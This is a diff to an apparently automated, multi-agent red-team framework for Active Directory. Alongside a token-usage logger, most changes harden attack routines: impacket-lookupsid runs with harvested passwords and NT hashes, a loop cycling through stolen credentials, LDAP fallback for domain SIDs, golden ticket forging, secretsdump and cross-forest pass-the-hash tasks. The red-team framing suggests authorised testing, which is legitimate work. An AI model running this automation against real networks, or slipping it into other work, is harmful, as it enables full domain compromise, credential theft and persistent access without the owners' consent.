@@ -916,6 +916,9 @@ async def run_multi_agent_operation(
         asyncio.create_task(_auto_foreign_dcsync(dispatcher), name="auto_foreign_dcsync"),
         asyncio.create_task(_auto_cross_forest_pivot(dispatcher), name="auto_cross_forest_pivot"),
         asyncio.create_task(_auto_acl_chain_follow(dispatcher), name="auto_acl_chain_follow"),
+        asyncio.create_task(
+            _periodic_token_usage_summary(task_queue, operation_id), name="token_usage_summary"
+        ),
     ]
 
     # Build initial prompt for orchestrator
@@ -1532,6 +1535,41 @@ async def _extend_operation_lock(
                 logger.warning(f"Failed to extend lock for operation {operation_id}")
         except Exception as e:
             logger.error(f"Error extending operation lock: {e}")
+
+
+async def _periodic_token_usage_summary(
+    task_queue: RedisTaskQueue,
+    operation_id: str,
+    interval: float = 120.0,
+) -> None:
+    """Log aggregate token usage and estimated cost every `interval` seconds."""
+    while True:
+        await asyncio.sleep(interval)
+        try:
+            usage = await task_queue.get_token_usage(operation_id)
+            if not usage or not (usage["input_tokens"] or usage["output_tokens"]):
+                continue
+            in_tok = usage["input_tokens"]
+            out_tok = usage["output_tokens"]
+            total = in_tok + out_tok
+            model = usage.get("model", "")
+            cost_str = ""
+            if model:
+                try:
+                    import litellm
+
+                    in_cost, out_cost = litellm.cost_per_token(
+                        model, prompt_tokens=in_tok, completion_tokens=out_tok
+                    )
+                    cost_str = f" | ${in_cost + out_cost:.4f}"
+                except Exception:
+                    pass
+            logger.opt(colors=True).info(
+                f"<magenta>💰 [token-usage] {total:,} tokens "
+                f"(in: {in_tok:,}  out: {out_tok:,}){cost_str}</magenta>"
+            )
+        except Exception as e:
+            logger.debug(f"Token usage summary failed: {e}")
 
 
 def _should_stop_background_task(state: SharedRedTeamState) -> bool:
@@ -2350,6 +2388,8 @@ async def _auto_credential_access(
     # NOTE: All tracking now uses state fields instead of local variables
     # This enables recovery after orchestrator restart without duplicate work
     last_user_count: dict[str, int] = {}  # Only this stays local (non-critical)
+    foreign_idle_backoff = 0.25
+    foreign_idle_backoff_cap = min(check_interval, 5.0)
 
     while True:
         try:
@@ -2460,17 +2500,29 @@ async def _auto_credential_access(
                 or has_unsprayed_users
                 or has_unprocessed_foreign
             ):
+                should_backoff_foreign_poll = False
                 if has_unprocessed_foreign is False and get_multi_forest_mode():
                     _undom = state.get_undominated_forests()
                     if _undom:
+                        should_backoff_foreign_poll = True
                         logger.info(
                             f"🌲 cred-access gate: undominated={_undom}, "
                             f"processed_asrep={state.processed_asrep_domains}, "
                             f"has_new_creds={has_new_creds}, has_new_hashes={has_new_hashes}, "
                             f"has_new_domains={has_new_domains}, _iter_domains={_iter_domains}"
                         )
+                if should_backoff_foreign_poll:
+                    await asyncio.sleep(foreign_idle_backoff)
+                    foreign_idle_backoff = min(
+                        foreign_idle_backoff * 2,
+                        foreign_idle_backoff_cap,
+                    )
+                else:
+                    foreign_idle_backoff = 0.25
                 await dispatcher.wait_for_credential_access_signal(check_interval)
                 continue
+
+            foreign_idle_backoff = 0.25
 
             if not state.all_credentials and not state.all_hashes:
                 for domain in sorted(_iter_domains):
@@ -3764,12 +3816,14 @@ async def _auto_golden_ticket(
                     logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")
 
             # Get domains that already have golden tickets (from persisted state)
-            # Exclude failed attempts so they can be retried
+            # Exclude failed attempts so they can be retried. In particular,
+            # failed_no_sid must remain retryable so manual SID injection or a
+            # later LDAP fallback can unblock golden ticket generation.
             processed_domains = {
                 t.get("domain", "").lower()
                 for t in state.golden_tickets
                 if t.get("domain")
-                and t.get("status") not in ("failed_ticketer", "failed_exception")
+                and t.get("status") not in ("failed_no_sid", "failed_ticketer", "failed_exception")
             }
 
             # Check for unprocessed krbtgt hashes BEFORE checking completed flag.
@@ -3910,9 +3964,11 @@ async def _auto_golden_ticket(
 
                     sid_match = None  # Initialize for case where we skip lookupsid
                     output = ""  # Initialize for error handling
+                    attempted_sid_lookup = False
 
                     # Only run lookupsid if we don't already have a cached SID
                     if not domain_sid:
+                        attempted_sid_lookup = True
                         if cred:
                             # Password-based auth
                             cmd = [
@@ -3950,76 +4006,81 @@ async def _auto_golden_ticket(
                                 cmd, timeout_seconds=60
                             )
                         except (TransientToolError, RetryError) as e:
-                            # All retries exhausted due to transient errors (Redis timeout, network)
-                            # Don't mark as permanently failed - allow retry on next check interval
+                            # Retries were exhausted. Preserve the failure details and
+                            # continue into LDAP fallback instead of skipping the domain.
+                            output = str(e)
                             logger.warning(
-                                f"🎫 Auto-golden-ticket: Transient errors for {domain} after retries, "
-                                f"will retry next interval: {e}"
+                                f"🎫 Auto-golden-ticket: lookupsid retries exhausted for {domain}; "
+                                f"trying LDAP fallback next: {e}"
                             )
-                            # Don't add to processed_domains - allow retry on next iteration
-                            continue
+                        else:
+                            output = stdout + "\n" + (stderr or "")
 
-                        output = stdout + "\n" + (stderr or "")
-
-                        # Debug log to see actual lookupsid output
-                        output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
-                        logger.debug(
-                            f"🎫 Auto-golden-ticket: lookupsid output for {domain}: {output_preview}"
-                        )
-
-                        # Parse domain SID from output
-                        sid_match = re.search(
-                            r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
-                        )
-
-                        # If auth failed (LOGON_FAILURE or ACCOUNT_LOCKED_OUT), try other credentials
-                        # This handles cases where hash is from wrong domain or account is locked
-                        auth_failed = (
-                            "STATUS_LOGON_FAILURE" in output
-                            or "STATUS_ACCOUNT_LOCKED_OUT" in output
-                        )
-                        tried_users = {cred.username.lower()} if cred else set()
-                        if not sid_match and auth_failed:
-                            logger.warning(
-                                f"🎫 Auto-golden-ticket: Auth failed for {domain}, trying other credentials"
+                            # Debug log to see actual lookupsid output
+                            output_preview = (
+                                output[:300].replace("\n", "\\n") if output else "<empty>"
                             )
-                            # Try other password credentials (skip the one that just failed)
-                            for c in state.all_credentials:
-                                if not c.password or c.username.lower() in tried_users:
-                                    continue
-                                tried_users.add(c.username.lower())
-                                cmd = [
-                                    "impacket-lookupsid",
-                                    f"{c.domain}/{c.username}:{c.password}@{dc_ip}",
-                                ]
-                                logger.info(
-                                    f"🎫 Auto-golden-ticket: Retrying lookupsid with "
-                                    f"{c.domain}\\{c.username}"
+                            logger.debug(
+                                f"🎫 Auto-golden-ticket: lookupsid output for {domain}: {output_preview}"
+                            )
+
+                            # Parse domain SID from output
+                            sid_match = re.search(
+                                r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
+                            )
+
+                            # If auth failed (LOGON_FAILURE or ACCOUNT_LOCKED_OUT), try other credentials
+                            # This handles cases where hash is from wrong domain or account is locked
+                            auth_failed = (
+                                "STATUS_LOGON_FAILURE" in output
+                                or "STATUS_ACCOUNT_LOCKED_OUT" in output
+                            )
+                            tried_users = {cred.username.lower()} if cred else set()
+                            if not sid_match and auth_failed:
+                                logger.warning(
+                                    f"🎫 Auto-golden-ticket: Auth failed for {domain}, trying other credentials"
                                 )
-                                try:
-                                    stdout, stderr, _ = await _run_lookupsid_with_retry(
-                                        cmd, timeout_seconds=60
-                                    )
-                                    output = stdout + "\n" + (stderr or "")
-                                    output_preview = (
-                                        output[:300].replace("\n", "\\n") if output else "<empty>"
-                                    )
-                                    sid_match = re.search(
-                                        r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
-                                    )
-                                    if sid_match:
-                                        break  # Success! Exit retry loop
-                                    # If this cred also failed with auth error, continue to next
-                                    if (
-                                        "STATUS_LOGON_FAILURE" in output
-                                        or "STATUS_ACCOUNT_LOCKED_OUT" in output
-                                    ):
-                                        logger.warning(
-                                            f"🎫 Auto-golden-ticket: {c.username} also failed, trying next"
-                                        )
+                                # Try other password credentials (skip the one that just failed)
+                                for c in state.all_credentials:
+                                    if not c.password or c.username.lower() in tried_users:
                                         continue
-                                except (TransientToolError, RetryError):
-                                    continue  # Try next credential
+                                    tried_users.add(c.username.lower())
+                                    cmd = [
+                                        "impacket-lookupsid",
+                                        f"{c.domain}/{c.username}:{c.password}@{dc_ip}",
+                                    ]
+                                    logger.info(
+                                        f"🎫 Auto-golden-ticket: Retrying lookupsid with "
+                                        f"{c.domain}\\{c.username}"
+                                    )
+                                    try:
+                                        stdout, stderr, _ = await _run_lookupsid_with_retry(
+                                            cmd, timeout_seconds=60
+                                        )
+                                        output = stdout + "\n" + (stderr or "")
+                                        output_preview = (
+                                            output[:300].replace("\n", "\\n")
+                                            if output
+                                            else "<empty>"
+                                        )
+                                        sid_match = re.search(
+                                            r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
+                                        )
+                                        if sid_match:
+                                            cred = c
+                                            break  # Success! Exit retry loop
+                                        # If this cred also failed with auth error, continue to next
+                                        if (
+                                            "STATUS_LOGON_FAILURE" in output
+                                            or "STATUS_ACCOUNT_LOCKED_OUT" in output
+                                        ):
+                                            logger.warning(
+                                                f"🎫 Auto-golden-ticket: {c.username} also failed, trying next"
+                                            )
+                                            continue
+                                    except (TransientToolError, RetryError) as retry_err:
+                                        output = str(retry_err)
+                                        continue  # Try next credential
 
                         # Use lookupsid result if successful
                         if sid_match:
@@ -4029,9 +4090,9 @@ async def _auto_golden_ticket(
                                 f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}"
                             )
 
-                    # If we still don't have domain_sid, try LDAP fallback
-                    # (only if we actually ran lookupsid and it failed)
-                    if not domain_sid and output:
+                    # If we still don't have domain_sid, try LDAP fallback.
+                    # Do this after any lookupsid failure, including repeated timeouts.
+                    if not domain_sid and attempted_sid_lookup and cred and cred.password:
                         output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
                         logger.warning(
                             f"🎫 Auto-golden-ticket: lookupsid failed for {domain}, "
@@ -4048,6 +4109,11 @@ async def _auto_golden_ticket(
                                 )
                         except Exception as ldap_err:
                             logger.warning(f"🎫 Auto-golden-ticket: LDAP failed: {ldap_err}")
+                    elif not domain_sid and attempted_sid_lookup and not cred:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: No password credential available for LDAP fallback "
+                            f"for {domain}; lookupsid used hash-only auth"
+                        )
 
                     # Final check - if we still don't have domain_sid, fail
                     if not domain_sid:
@@ -4227,10 +4293,23 @@ async def _auto_golden_ticket(
                                     "-hashes",
                                     f":{nt_hash}",
                                 ]
+                            parent_output = ""
                             try:
                                 parent_stdout, parent_stderr, _ = await _run_lookupsid_with_retry(
                                     parent_cmd, timeout_seconds=60
                                 )
+                            except (TransientToolError, RetryError) as parent_err:
+                                parent_output = str(parent_err)
+                                logger.warning(
+                                    f"🎫 Auto-golden-ticket: Parent lookupsid retries exhausted for "
+                                    f"{parent_domain}; trying LDAP fallback next: {parent_err}"
+                                )
+                            except Exception as e:
+                                parent_output = str(e)
+                                logger.warning(
+                                    f"🎫 Auto-golden-ticket: Failed to get parent SID via lookupsid: {e}"
+                                )
+                            else:
                                 parent_output = parent_stdout + "\n" + (parent_stderr or "")
                                 parent_sid_match = re.search(
                                     r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", parent_output
@@ -4242,38 +4321,35 @@ async def _auto_golden_ticket(
                                         f"🎫 Auto-golden-ticket: Got parent SID {parent_sid} "
                                         f"for {parent_domain}"
                                     )
-                                else:
-                                    parent_preview = parent_output[:300].replace("\n", "\\n")
-                                    logger.warning(
-                                        f"🎫 Auto-golden-ticket: lookupsid returned no SID for "
-                                        f"{parent_domain}, trying LDAP fallback. "
-                                        f"Output: {parent_preview}"
-                                    )
-                                    # LDAP fallback for parent SID
-                                    try:
-                                        parent_sid = await _get_domain_sid_via_ldap(
-                                            parent_dc_ip, parent_domain, cred, auth_hash
-                                        )
-                                        if parent_sid:
-                                            state.domain_sids[parent_domain.lower()] = parent_sid
-                                            logger.info(
-                                                f"🎫 Auto-golden-ticket: Got parent SID via LDAP: "
-                                                f"{parent_sid}"
-                                            )
-                                        else:
-                                            logger.warning(
-                                                f"🎫 Auto-golden-ticket: LDAP also returned no "
-                                                f"SID for {parent_domain}"
-                                            )
-                                    except Exception as ldap_err:
-                                        logger.warning(
-                                            f"🎫 Auto-golden-ticket: Parent LDAP fallback "
-                                            f"failed: {ldap_err}"
-                                        )
-                            except Exception as e:
+
+                            if not parent_sid:
+                                parent_preview = parent_output[:300].replace("\n", "\\n")
                                 logger.warning(
-                                    f"🎫 Auto-golden-ticket: Failed to get parent SID: {e}"
+                                    f"🎫 Auto-golden-ticket: lookupsid returned no SID for "
+                                    f"{parent_domain}, trying LDAP fallback. "
+                                    f"Output: {parent_preview}"
                                 )
+                                # LDAP fallback for parent SID
+                                try:
+                                    parent_sid = await _get_domain_sid_via_ldap(
+                                        parent_dc_ip, parent_domain, cred, auth_hash
+                                    )
+                                    if parent_sid:
+                                        state.domain_sids[parent_domain.lower()] = parent_sid
+                                        logger.info(
+                                            f"🎫 Auto-golden-ticket: Got parent SID via LDAP: "
+                                            f"{parent_sid}"
+                                        )
+                                    else:
+                                        logger.warning(
+                                            f"🎫 Auto-golden-ticket: LDAP also returned no "
+                                            f"SID for {parent_domain}"
+                                        )
+                                except Exception as ldap_err:
+                                    logger.warning(
+                                        f"🎫 Auto-golden-ticket: Parent LDAP fallback "
+                                        f"failed: {ldap_err}"
+                                    )
 
                     # Generate golden ticket
                     # Prefer AES256 key over NTLM hash for modern Windows (2016+)
@@ -6532,6 +6608,7 @@ async def _auto_cross_forest_pivot(
                         "password": sd_cred.password,
                         "reason": "mssql_exploit_secretsdump",
                         "techniques": ["secretsdump"],
+                        "parent_vuln_id": vuln.vuln_id,
                         "parent_credential_id": parent_id,
                         "parent_attack_step": parent_step,
                     }
@@ -6624,6 +6701,7 @@ async def _auto_cross_forest_pivot(
                         "hash_type": hash_obj.hash_type,
                         "reason": "cross_forest_pth",
                         "techniques": ["secretsdump"],
+                        "parent_vuln_id": vuln.vuln_id,
                     }
                     if dispatcher._task_queue:
                         pth_task_id = await dispatcher._task_queue.submit_task(
